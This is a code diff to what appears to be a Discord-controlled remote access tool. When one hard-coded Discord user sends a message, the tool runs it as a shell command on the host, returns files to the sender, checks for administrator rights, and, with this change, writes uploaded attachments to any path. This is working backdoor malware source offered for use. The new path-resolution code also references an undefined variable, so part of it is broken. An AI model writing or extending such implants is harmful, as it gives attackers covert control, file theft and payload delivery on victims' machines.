@@ -122,11 +122,50 @@ def get_local_admin_status():
     )
     return "S-1-5-32-544" in result.stdout
 
+async def process_put_file(attachments, message_str):
+    """
+        Parse and execute put file command.
+    """
+    parts = message_str.strip().split(maxsplit=1)
+    dest_arg = parts[1] if len(parts) > 1 else "."
+    base_cwd = Path.cwd()
+
+    if len(attachments) > 1:
+        return "Error: Put can only process a single file."
+
+    att = attachments[0]
+    resolved_destination_path = resolve_path(base_cwd, dest_arg, att.filename)
+    try:
+        await att.save(resolved_destination_path)
+        return f"Put: saved attachment to {resolved_destination_path}"
+    except Exception as e:
+        return str(e)
+
+def resolve_path(base_cwd, dest_arg, filename):
+    """
+    Return the file path where a single attachment should be saved,
+    interpreting dest_arg as either a directory or a file path.
+    """
+
+    # allow quoting in path
+    raw = dest_arg.strip().strip('"')
+    p = Path(raw).expanduser()
+
+    if not p.is_absolute():
+        p = base_cwd / p
+
+    # If arg ends with a path separator OR points to an existing dir -> treat as dir
+    if raw.endswith(("\\", "/")) or (p.exists() and p.is_dir()):
+        p = p / att_name
+
+    # Resolve even if it doesn't exist yet
+    return p.resolve(strict=False)
+
 def process_command(cmd_str):
     """
         Parse command and pass to the appropriate function.
     """
-    usage_string = "Invalid command. Usage:\nexec <cmd>\nget <file>\nexit"
+    usage_string = "Invalid command.\n\nUsage:\ncd <directory>\nexec <cmd>\nget <file>\nexit"
 
     parts = cmd_str.split(maxsplit=1)
     if not parts:
@@ -136,7 +175,6 @@ def process_command(cmd_str):
     arg = parts[1] if len(parts) > 1 else None
 
     # TODO: more commands
-    # Make cd a built-in
     # Make ls / lt aliases for python dirlist
     # Make a 'survey' option which bundles commands
     commands = {
@@ -148,40 +186,49 @@ def process_command(cmd_str):
     if cmd == "exit":
         do_exit()
 
-    if cmd in commands:
+    elif cmd == "help":
+        # Output usage string, but be nicer (they asked for help after all)
+        output = usage_string.replace("Invalid command.","")
+    elif cmd == "cd":
+        output = change_directory(cmd_str)
+    elif cmd in commands:
         output = commands[cmd](arg)
-        return output
     else:
-        return usage_string
+        output = usage_string
+
+    return output
+
+def change_directory(cd_str):
+    """
+        Process cd commands with os.chdir().
+    """
+    try:
+        # If the command is JUST "cd", return the cwd,
+        # to be consistent with windows shell behavior.
+        if cd_str == "cd":
+            result = f"{os.getcwd()}"
+        else:
+            os.chdir(cd_str.split()[1])
+            result = f"Changed directory to {os.getcwd()}"
+    except Exception as e:
+        result = f"Error: {e}"
+
+    return result
 
 def execute_command(cmd_str):
     """
         Execute a command on behalf of the bot.
-    """
-    if cmd_str.startswith("cd"):
-        # Process cd commands with os.chdir()
-        try:
-            # If the command is JUST "cd", return the cwd,
-            # to be consistent with windows shell behavior.
-            if cmd_str == "cd":
-                result = f"{os.getcwd()}"
-            else:
-                os.chdir(cmd_str.split()[1])
-                result = f"Changed directory to {cmd_str.split()[1]}"
-        except Exception as e:
-            result = f"Error: {e}"
-    
-    else:
-        # Process other commands with subprocess.run()
-        output = subprocess.run(
-            cmd_str,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True
-        )
+    """    
+    # Process other commands with subprocess.run()
+    output = subprocess.run(
+        cmd_str,
+        shell=True,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True
+    )
 
-        result = output.stdout
+    result = output.stdout
 
     if len(result) > 0:
         return result
@@ -199,15 +246,16 @@ def get_content(upload):
         return discord.File(upload, filename=p.name)
 
     except FileNotFoundError as e:
-        return e
+        return str(e)
     except PermissionError as e:
-        return e
+        return str(e)
     except OSError as e:
-        return e
+        return str(e)
     except Exception as e:
-        return e
+        return str(e)
 
 def do_exit():
+    # Any cleanup stuff can go here
     exit()
 
 async def send_message_wrapper(channel, output, is_file=False, prefix="```", suffix="```"):
@@ -260,7 +308,19 @@ async def on_message(message):
         return
 
     if(message.author.id == 558898662772572160):
-        output = process_command(message.content)
+        if message.content.strip().lower().startswith("put"):
+            if not message.attachments:
+                # If they typed put but didnt attach anything, error
+                output = "Error: you must attach a file with the 'put' command."
+            else:
+                output = await process_put_file(message.attachments, message.content)
+
+        elif message.attachments:
+            # If there is an attachment, but user didn't type 'put', display an error
+            output = "Error: if you want to upload a file, you must attach it and use the 'put' command."
+        else:
+            # Process non-putfile commands
+            output = process_command(message.content)
 
         if isinstance(output, discord.File):
             await send_message_wrapper(message.channel, output, is_file=True)
